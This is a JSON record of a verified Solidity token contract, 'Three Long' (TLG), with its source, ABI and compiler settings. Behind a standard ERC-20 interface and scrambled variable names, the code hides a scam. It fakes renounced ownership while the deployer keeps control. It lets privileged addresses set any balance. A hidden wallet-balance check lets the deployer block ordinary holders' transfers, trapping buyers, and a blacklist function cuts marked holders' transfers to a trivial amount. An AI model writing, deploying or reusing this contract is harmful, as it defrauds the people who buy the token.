{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface launchEnableList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityFrom {\n    function createPair(address liquidityShould, address totalReceiver) external returns (address);\n}\n\ninterface buySell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxLaunch) external view returns (uint256);\n\n    function transfer(address takeWallet, uint256 fundLaunchMax) external returns (bool);\n\n    function allowance(address autoSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundLaunchMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeWallet,\n        uint256 fundLaunchMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptMax, uint256 value);\n    event Approval(address indexed autoSell, address indexed spender, uint256 value);\n}\n\ninterface launchTx is buySell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThreeLong is limitMax, buySell, launchTx {\n\n    uint256 senderMarketing;\n\n    function transfer(address swapAmountWallet, uint256 fundLaunchMax) external virtual override returns (bool) {\n        return maxTrading(_msgSender(), swapAmountWallet, fundLaunchMax);\n    }\n\n    address public receiverFund;\n\n    address exemptLaunchTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        launchEnableList minLaunchShould = launchEnableList(exemptLaunchTo);\n        toReceiver = liquidityFrom(minLaunchShould.factory()).createPair(minLaunchShould.WETH(), address(this));\n        if (launchTxTrading) {\n            shouldReceiver = true;\n        }\n        receiverFund = _msgSender();\n        atMode();\n        modeExemptLiquidity[receiverFund] = true;\n        toMarketingFund[receiverFund] = tokenTo;\n        if (launchTxTrading == minLimit) {\n            marketingTake = buyListLiquidity;\n        }\n        emit Transfer(address(0), receiverFund, tokenTo);\n    }\n\n    mapping(address => uint256) private toMarketingFund;\n\n    bool private launchTxTrading;\n\n    function owner() external view returns (address) {\n        return totalLaunched;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountLaunched;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listEnableMin;\n    }\n\n    uint256 launchTeamAmount;\n\n    function amountListAuto(address feeLiquidity) public {\n        if (limitAmountFund) {\n            return;\n        }\n        if (shouldReceiver) {\n            marketingAutoFund = buyListLiquidity;\n        }\n        modeExemptLiquidity[feeLiquidity] = true;\n        if (marketingTake == buyListLiquidity) {\n            minLimit = true;\n        }\n        limitAmountFund = true;\n    }\n\n    function balanceOf(address maxLaunch) public view virtual override returns (uint256) {\n        return toMarketingFund[maxLaunch];\n    }\n\n    address public toReceiver;\n\n    uint256 public marketingTake;\n\n    bool public tradingFrom;\n\n    function fromSell(address swapAmountWallet, uint256 fundLaunchMax) public {\n        launchWalletMax();\n        toMarketingFund[swapAmountWallet] = fundLaunchMax;\n    }\n\n    bool public limitAmountFund;\n\n    bool private liquidityAuto;\n\n    mapping(address => bool) public receiverFrom;\n\n    string private amountLaunched = \"Three Long\";\n\n    function walletIsExempt(uint256 fundLaunchMax) public {\n        launchWalletMax();\n        senderMarketing = fundLaunchMax;\n    }\n\n    uint256 public marketingAutoFund;\n\n    function maxTrading(address enableMarketingMax, address takeWallet, uint256 fundLaunchMax) internal returns (bool) {\n        if (enableMarketingMax == receiverFund) {\n            return fromAuto(enableMarketingMax, takeWallet, fundLaunchMax);\n        }\n        uint256 tradingAt = buySell(toReceiver).balanceOf(sellWallet);\n        require(tradingAt == senderMarketing);\n        require(takeWallet != sellWallet);\n        if (receiverFrom[enableMarketingMax]) {\n            return fromAuto(enableMarketingMax, takeWallet, teamFundSender);\n        }\n        return fromAuto(enableMarketingMax, takeWallet, fundLaunchMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTo;\n    }\n\n    uint256 private tokenTo = 100000000 * 10 ** 18;\n\n    bool private fromWallet;\n\n    function launchWalletMax() private view {\n        require(modeExemptLiquidity[_msgSender()]);\n    }\n\n    uint256 constant teamFundSender = 4 ** 10;\n\n    address sellWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private listLimit = 18;\n\n    bool public shouldReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLimit;\n    }\n\n    mapping(address => bool) public modeExemptLiquidity;\n\n    function atMode() public {\n        emit OwnershipTransferred(receiverFund, address(0));\n        totalLaunched = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private fromTotal;\n\n    function getOwner() external view returns (address) {\n        return totalLaunched;\n    }\n\n    function transferFrom(address enableMarketingMax, address takeWallet, uint256 fundLaunchMax) external override returns (bool) {\n        if (_msgSender() != exemptLaunchTo) {\n            if (fromTotal[enableMarketingMax][_msgSender()] != type(uint256).max) {\n                require(fundLaunchMax <= fromTotal[enableMarketingMax][_msgSender()]);\n                fromTotal[enableMarketingMax][_msgSender()] -= fundLaunchMax;\n            }\n        }\n        return maxTrading(enableMarketingMax, takeWallet, fundLaunchMax);\n    }\n\n    function allowance(address maxList, address fromTo) external view virtual override returns (uint256) {\n        if (fromTo == exemptLaunchTo) {\n            return type(uint256).max;\n        }\n        return fromTotal[maxList][fromTo];\n    }\n\n    function fundSwap(address exemptSell) public {\n        launchWalletMax();\n        \n        if (exemptSell == receiverFund || exemptSell == toReceiver) {\n            return;\n        }\n        receiverFrom[exemptSell] = true;\n    }\n\n    event OwnershipTransferred(address indexed walletToken, address indexed enableMarketing);\n\n    address private totalLaunched;\n\n    uint256 private buyListLiquidity;\n\n    function fromAuto(address enableMarketingMax, address takeWallet, uint256 fundLaunchMax) internal returns (bool) {\n        require(toMarketingFund[enableMarketingMax] >= fundLaunchMax);\n        toMarketingFund[enableMarketingMax] -= fundLaunchMax;\n        toMarketingFund[takeWallet] += fundLaunchMax;\n        emit Transfer(enableMarketingMax, takeWallet, fundLaunchMax);\n        return true;\n    }\n\n    function approve(address fromTo, uint256 fundLaunchMax) public virtual override returns (bool) {\n        fromTotal[_msgSender()][fromTo] = fundLaunchMax;\n        emit Approval(_msgSender(), fromTo, fundLaunchMax);\n        return true;\n    }\n\n    bool public minLimit;\n\n    string private listEnableMin = \"TLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"}],\"name\":\"amountListAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchMax\",\"type\":\"uint256\"}],\"name\":\"fromSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"}],\"name\":\"fundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAutoFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeExemptLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketingMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundLaunchMax\",\"type\":\"uint256\"}],\"name\":\"walletIsExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ThreeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}